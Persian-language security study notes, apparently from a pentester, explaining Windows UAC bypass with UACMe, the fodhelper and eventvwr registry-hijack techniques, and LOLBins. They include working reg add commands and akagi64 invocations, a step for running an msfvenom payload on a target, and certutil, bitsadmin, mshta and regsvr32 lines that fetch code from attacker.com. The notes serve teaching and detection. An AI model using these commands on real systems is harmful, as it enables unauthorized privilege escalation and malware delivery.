

---

# 🔹 اول: UAC چی هست؟

- **UAC (User Account Control)** مکانیزمی توی ویندوز هست که موقع اجرای کارهای حساس (مثل نصب برنامه یا تغییرات سیستمی) یه پنجره باز می‌کنه و ازت می‌پرسه: _"آیا می‌خواهید این برنامه تغییرات ایجاد کند؟"_
    
- هدف: محدود کردن اجرای بی‌اجازه برنامه‌ها حتی وقتی کاربر عضو گروه **Administrators** باشه.
    
- به صورت پیش‌فرض، حتی یوزرهای ادمین هم با سطح **Medium Integrity** کار می‌کنن و برای رسیدن به **High Integrity** باید UAC رو قبول کنن.
    

---

# 🔹 حالا UACMe چیه؟

- **UACMe (aka Akagi Project)** یه ابزار **open-source** برای **Bypass کردن UAC** هست.
    
- توسط _hfiref0x_ توسعه داده شده.
    
- بیش از 70+ روش مختلف برای Bypass UAC داخلش پیاده‌سازی شده.
    
- ایده اصلی: پیدا کردن **ضعف‌ها و misconfigurationها** در مکانیزم UAC و سوءاستفاده از اون‌ها.
    

---

# 🔹 روش کلی کار UACMe

1. شما روی سیستم یه دسترسی **معمولی ادمین (Medium Integrity)** دارید.
    
2. می‌خواید بدون نمایش پنجره UAC → دسترسی رو به **High Integrity (SYSTEM-like)** ارتقا بدید.
    
3. UACMe از **تکنیک‌های شناخته‌شده ویندوز** مثل:
    
    - اجرای برنامه‌هایی که به‌طور خودکار با دسترسی بالاتر اجرا می‌شن (autoElevate apps)
        
    - DLL Hijacking
        
    - COM Interface Misconfiguration
        
    - استفاده از LOLBins (مثل `eventvwr.exe`, `computerdefaults.exe`, `fodhelper.exe`)  
        سوءاستفاده می‌کنه تا برنامه شما رو مستقیم با سطح دسترسی بالا اجرا کنه.
        

---

# 🔹 یک سناریوی واقعی با UACMe

فرض کن دسترسی Meterpreter داری ولی فقط **Medium Integrity** (یعنی هنوز SYSTEM نیستی).

1. دانلود UACMe روی سیستم قربانی (مثلاً `akagi64.exe`).
    
2. اجرای یک تکنیک، مثلاً روش fodhelper (معروف به Method 33):
    
    ```bash
    akagi64.exe 33 C:\Windows\System32\cmd.exe
    ```
    
3. این دستور برنامه fodhelper.exe (که autoElevate است) رو صدا می‌زنه.
    
4. با تغییر کلید رجیستری مرتبط، کاری می‌کنه که fodhelper.exe به جای اجرای کار خودش، `cmd.exe` رو با سطح **High Integrity** اجرا کنه.
    
5. در نهایت یه cmd باز می‌شه با سطح دسترسی بالا (UAC bypass شد).
    

📌 بدون اینکه هیچ پنجره UAC برای کاربر نمایش داده بشه!

---

# 🔹 چرا UACMe مهمه؟

- مهاجم بعد از گرفتن دسترسی اولیه (Low/Medium Integrity)، می‌تونه به راحتی به High Integrity بره.
    
- از اونجا می‌تونه کارهای سنگین‌تر انجام بده:
    
    - نصب سرویس‌های مخرب
        
    - دسترسی به فایل‌های حساس‌تر
        
    - اجرای ابزارهای privilege escalation مثل Mimikatz
        

---

# 🔹 تفاوت UAC Bypass با Privilege Escalation

- **UAC Bypass**: فقط پرش از Medium به High Integrity برای یوزر ادمین هست (نه لوکال یوزر ساده).
    
- **Privilege Escalation**: می‌تونه از یه یوزر محدود → ادمین یا SYSTEM بره.
    

یعنی UAC bypass معمولاً وقتی کاربرد داره که شما **قبلاً ادمین هستی** ولی ویندوز جلوتو با UAC گرفته.

---

## 📌 جمع‌بندی

- UACMe ابزاریه که بیش از 70 روش برای **Bypass UAC** پیاده‌سازی کرده.
    
- از ضعف‌های خود ویندوز (LOLbins, COM, autoElevate apps) استفاده می‌کنه.
    
- هدفش: تبدیل دسترسی **Admin Medium Integrity** → **Admin High Integrity** بدون نمایش پنجره UAC.
    

---


---

# 🔹 AutoElevate یعنی چی؟

- بعضی برنامه‌های سیستمی ویندوز به خاطر اینکه کارهای حساس انجام می‌دن، مایکروسافت اون‌ها رو به صورت **autoElevate** علامت‌گذاری کرده.
    
- یعنی وقتی اجرا می‌شن، مستقیم با سطح دسترسی **High Integrity (Administrator)** باز می‌شن، **بدون نمایش UAC Prompt**.
    
- مثال: `eventvwr.exe`, `fodhelper.exe`, `computerdefaults.exe`.
    
- این ویژگی برای راحتی کار کاربره، ولی هکر می‌تونه سوءاستفاده کنه → کاری کنه این برنامه‌ها به جای کار اصلی‌شون، بدافزار مهاجم رو اجرا کنن.
    

---

# 🔹 Feature On Demand (FoD)

- ویندوز یه سری قابلیت‌ها داره که پیش‌فرض نصب نیستن (مثلاً زبان‌ها، اجزای اضافی مثل RSAT).
    
- برای مدیریت این قابلیت‌ها، برنامه‌ای به اسم **fodhelper.exe** استفاده می‌شه.
    
- چون FoD بخشی از سیستم‌عامل و نصب اجزای سیستمیه → `fodhelper.exe` همیشه با دسترسی بالا اجرا می‌شه.
    
- همین ویژگی باعث شده به یه **LOLBIN برای UAC bypass** تبدیل بشه.
    

---

# 🔹 سوییچ‌ها و نحوه استفاده از این ابزارها

این ابزارها خودشون سوییچ‌هایی دارن (چون برنامه‌های ویندوزی هستن). ما مهاجما معمولاً به **سوییچ‌هاشون کاری نداریم**، بلکه:

- از خود **خاصیت autoElevate** سوءاستفاده می‌کنیم.
    
- یعنی: با دستکاری رجیستری یا DLL hijacking باعث می‌شیم وقتی این برنامه اجرا شد، به جای کار اصلی، برنامه ما رو بالا بیاره.
    

---

## ✨ مثال‌ها

### 1. **fodhelper.exe**

کلید رجیستری مهم:

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

دستورات مهاجم:

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\System32\cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe
```

📌 نتیجه: `cmd.exe` با High Integrity باز می‌شه.

---

### 2. **eventvwr.exe**

کلید رجیستری مربوط به MMC snap-ins تغییر می‌کنه:

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Windows\System32\cmd.exe" /f
eventvwr.exe
```

📌 وقتی Event Viewer رو باز کنی، به جای لاگ‌ها، `cmd.exe` با سطح بالا اجرا می‌شه.

---

### 3. **computerdefaults.exe**

این هم مشابه کار می‌کنه: رجیستری مرتبط با Default Apps تغییر می‌کنه.

---

# 🔹 جمع‌بندی

- **autoElevate** = ویژگی اجرای خودکار برنامه‌های خاص ویندوز با دسترسی بالا.
    
- **Feature On Demand** = قابلیت‌های اختیاری ویندوز (مدیریتش با `fodhelper.exe`).
    
- **ابزارها (`eventvwr.exe`, `fodhelper.exe`, `computerdefaults.exe`)** خودشون سوییچ دارن، ولی برای هکر مهم نیست → مهم اینه که همیشه با دسترسی بالا اجرا می‌شن.
    
- مهاجم با تغییر رجیستری کاری می‌کنه که این برنامه‌ها به جای کار خودشون، بدافزار یا cmd.exe رو اجرا کنن.
    

---


download UACME


```
https://github.com/hfiref0x/UACME
```


حالا بعد از نصب ابزار میتونیم بیایم استفاده از ابزار msfvenom یک malisious payload بسازیم و اپلود کنیم روی سیستم تارگت و در نهایت بیایم  فایل اجرایی UACME  رو اپلود کنیم 

![[Pasted image 20250819015844.png]]


 و بعدش malisious payload خودمون رو با استفاده از UACME بیایم اجرا کنیم و به نوعی uac رو دور (bypass) کنیم 

```
akagi64.exe 33 c:\Users\admin\appdata\local\malware.exe
```




---

# 🔹 LOLBins یعنی چی؟

- **LOLBins** مخفف **Living Off The Land Binaries** هست.
    
- یعنی: **باینری‌ها و برنامه‌های قانونی خود ویندوز** (یا هر سیستم‌عامل دیگه) که به صورت پیش‌فرض وجود دارن و توسط مایکروسافت نصب شدن.
    

📌 مهاجم به جای آوردن بدافزار خارجی، از همین ابزارهای موجود در سیستم استفاده می‌کنه تا کمتر شناسایی بشه.

---

# 🔹 چرا مهم هستن؟

- چون **امضا و اعتبار رسمی مایکروسافت** رو دارن → آنتی‌ویروس و EDR سخت‌تر بهشون گیر میدن.
    
- همه‌ی سیستم‌های ویندوزی اون‌ها رو دارن → نیاز به دانلود ابزار اضافی نیست.
    
- می‌شه ازشون برای کارهای مخرب (execution, download, privilege escalation, UAC bypass) استفاده کرد.
    

---

# 🔹 مثال‌های معروف LOLBins

|برنامه|استفاده مخرب|توضیح|
|---|---|---|
|**certutil.exe**|دانلود فایل از اینترنت|`certutil -urlcache -split -f http://attacker.com/mal.exe mal.exe`|
|**bitsadmin.exe**|دانلود/آپلود فایل|`bitsadmin /transfer myjob http://attacker.com/file.exe C:\file.exe`|
|**mshta.exe**|اجرای اسکریپت مخرب HTML/JS|`mshta http://attacker.com/script.hta`|
|**regsvr32.exe**|اجرای DLL مخرب از راه دور|`regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll`|
|**wmic.exe**|اجرای دستورات روی سیستم محلی/remote|`wmic process call create calc.exe`|
|**rundll32.exe**|اجرای DLL مخرب|`rundll32.exe mydll.dll,EntryPoint`|
|**eventvwr.exe**|UAC bypass|سوءاستفاده از رجیستری|
|**fodhelper.exe**|UAC bypass|autoElevate program|

---

# 🔹 تفاوت: LOLBins vs LOLScripts vs LOLDrivers

- **LOLBins** → برنامه‌های باینری (exe, dll) موجود در سیستم.
    
- **LOLScripts** → اسکریپت‌های داخلی سیستم مثل `powershell.exe`, `cscript.exe`, `wscript.exe`.
    
- **LOLDrivers** → درایورهای قانونی که می‌شه ازشون سوءاستفاده کرد.
    

---

📌 در واقع، وقتی می‌گیم `fodhelper.exe` یا `eventvwr.exe` برای UAC bypass استفاده می‌شن → این‌ها نمونه‌ای از **LOLBins** هستن.

---



fodhelper.exe 


==یک فایل سیستمی قانونی و بخشی از ویندوز است که برای مدیریت ویژگی‌های اختیاری سیستم (Features on Demand) استفاده می‌شود، مانند نصب زبان‌های جدید یا قابلیت‌های خاص [1، 3]==. با این حال، به دلیل قابلیت اجرای با امتیازات بالا و بدون نیاز به تأیید کنترل حساب کاربری (UAC)، گاهی اوقات توسط مهاجمان در حملات افزایش سطح دسترسی (Privilege Escalation) برای اجرای کدهای مخرب مورد سوء استفاده قرار می‌گیرد [2، 3، 6].  

کاربرد اصلی `fodhelper.exe` 

- **مدیریت ویژگی‌های اختیاری:**
    
    وظیفه اصلی آن کمک به ویندوز در فعال یا غیرفعال کردن قابلیت‌های اختیاری پس از نصب است.
    
- **اجرا با امتیازات بالا:**
    
    این برنامه به‌صورت خودکار با امتیازات بالا اجرا می‌شود (Auto-elevated)، که این امکان را به آن می‌دهد تا بدون نمایش پاپ‌آپ UAC، به تنظیمات سیستمی دسترسی داشته باشد [3، 6].
    

چرا خطرناک است؟

- **سوء استفاده برای افزایش دسترسی:**
    
    به دلیل داشتن امتیازات بالا و اجرای بدون UAC، `fodhelper.exe` می‌تواند توسط مهاجمان مورد سوء استفاده قرار گیرد تا کدهای مخرب با دسترسی مدیر سیستم اجرا شود [2، 3].
    
- **حمله به رجیستری:**
    
    مهاجمان با دستکاری یک کلید خاص در رجیستری ویندوز، می‌توانند کاری کنند که `fodhelper.exe` به جای اجرای ویژگی‌های اختیاری، برنامه یا اسکریپت مخرب مورد نظر آن‌ها را اجرا کند [6، 7].
    

چگونه می‌توان از امن بودن آن اطمینان حاصل کرد؟ 

- **بررسی فایل در مکان اصلی:**
    
    برای اطمینان از اینکه فایل اصلی و قانونی است، باید بررسی کنید که `fodhelper.exe` در پوشه `C:\Windows\System32` قرار دارد [3، 4].
    
- **بررسی فرآیندها:**
    
    در هنگام اجرای فرآیند `fodhelper.exe`، در Task Manager، باید مطمئن شوید که هیچ برنامه یا اسکریپت مشکوکی در پس‌زمینه اجرا نمی‌شود.